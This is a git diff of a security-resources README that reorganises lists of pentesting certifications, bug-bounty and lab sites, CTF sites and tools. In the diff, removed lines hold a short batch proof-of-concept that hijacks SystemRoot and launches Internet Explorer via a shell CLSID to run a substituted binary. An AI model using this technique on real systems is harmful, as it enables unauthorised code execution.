@@ -1,17 +1,49 @@
-# RandomCyberStuff
+# Different Information Security Resources 
 
-### Bug Hunting 
+## Certs
 
-## Bug Hunting sites
+### Offensive Security certification (OSCP/OSWE/OSEP/OSED)  
+https://www.offsec.com/courses-and-certifications/
+- OffSec Certified Professional (OSCP)
+- OffSec Experienced Pentration Tester (OSEP)
+- OffSec Web Expert (OSWE)
+- OffSec Exploit Developer (OSED)
+
+### TCM Security (PJPT/PNPT/PCRP/PJMR)
+- Practical Junior Penetration Tester (PJPT) https://certifications.tcm-sec.com/pjpt/
+- Practical Network Penetration Tester Certification (PNPT) https://certifications.tcm-sec.com/pnpt/
+- Practical Creer-ready Professional (PCRP) https://certifications.tcm-sec.com/pcrp
+- Practical Junior Malware Researcher (PJMR) https://certifications.tcm-sec.com/pjmr
+
+### PortSwigger
+- Burp Suite Certified Practitioner https://portswigger.net/web-security/certification/how-it-works#what-the-exam-involves
+
+### eLearnSecurity (eCPPT/eWPTX)
+-  eLearnSecurity Certified Professional Penetration Tester (eCPPT) https://elearnsecurity.com/product/ecpptv2-certification/
+-  Web application Pentration Tester eXtreme (eWPTX) https://security.ine.com/certifications/ewptx-certification/
+
+## GIAC (GWAPT/GXPN/GPEN)
+- GIAC Web Application Penetration Tester (GWAPT) https://www.giac.org/certifications/web-application-penetration-tester-gwapt/
+- GIAC Exploit Researcher and Advance Penetration Tester (GXPN) https://www.giac.org/certifications/exploit-researcher-advanced-penetration-tester-gxpn/
+- GIAC Penetration Tester Certification (GPEN) https://www.giac.org/certifications/penetration-tester-gpen/
+
+### CEH Certified Ethical Hacker
+- https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/
+
+
+## Bug Hunting 
+
+### Bug Hunting sites
 
  - Pentesterlab: https://pentesterlab.com/
  - hackthebox: https://www.hackthebox.com/
 
- ### Labs 
+ ## Labs / Training 
  - Portswigger Web Academy: https://portswigger.net/web-security
  - Tryhackme: https://tryhackme.com/
  - Pentesterlab: https://pentesterlab.com/
  - hackthebox: https://www.hackthebox.com/
+ - OPSWAT Academy: https://learn.opswatacademy.com/certifications
  
  ## Bug reports
  
@@ -19,40 +51,12 @@
 - Bug Croud: https://bugcroud.com/crowdstream
 - Pen tester Land: https://pentester.land
 
- ## Website resource
- 
- - Any.run: https://any.run/
- allows anyone to register an account and to interactively analyze a particular file in real time
+  ## CTF Sites 
+- Pico CTF: https://play.picoctf.org/
 
-## Certs
-
-### TCM Security
-- PNPT Practical Network Penetration Tester Certification https://certifications.tcm-sec.com/pnpt/
-- PJPT Practical Junior Penetration Tester https://certifications.tcm-sec.com/pjpt/
-
-### eCPPT - eLearnSecurity Certified Professional Penetration Tester
-- [eLearnSecurity Certified Professional Penetration Tester](https://elearnsecurity.com/product/ecpptv2-certification/)
-
-### CEH Certified Ethical Hacker
-- https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/
-
-### Offensive Security certification
-- OSCP
-- OSCE
-- OSWE
-- OSEP
-
-## IE running code
-IE navigating to `shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}` you can spawn System restore. If you modify the `SystemRoot` environment variable and copy over DLLs you run them.
+- CTF learn: https://ctflearn.com/
 
 
-POC: 
-mkdir %temp%\System32
-FOR /R C:\Windows\System32\ %F IN (*.dll) DO COPY "%F" %temp%\System32\ /Y >NUL
-set a=C:\Windows\System32\calc.exe
-copy %a% %temp%\System32\rstrui.exe /Y > NUL
-set SystemRoot=%temp%
-start iexplore shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}
 
 ## Search Resources 
 
@@ -87,10 +91,6 @@ start iexplore shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}
 29. Packet Storm Security—Browse latest vulnerabilities and exploits.
 30. SearchCode—Search 75 billion lines of code from 40 million projects.
  
-## CTF Sites 
-- Pico CTF: https://play.picoctf.org/
-
-- CTF learn: https://ctflearn.com/
 
 ## Software / Tools
 
@@ -103,3 +103,9 @@ start iexplore shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}
 
 - OPSWAT academy https://opswatacademy.com/page/course-list
 
+
+
+ ## Website resource
+ 
+ - Any.run: https://any.run/
+ allows anyone to register an account and to interactively analyze a particular file in real time
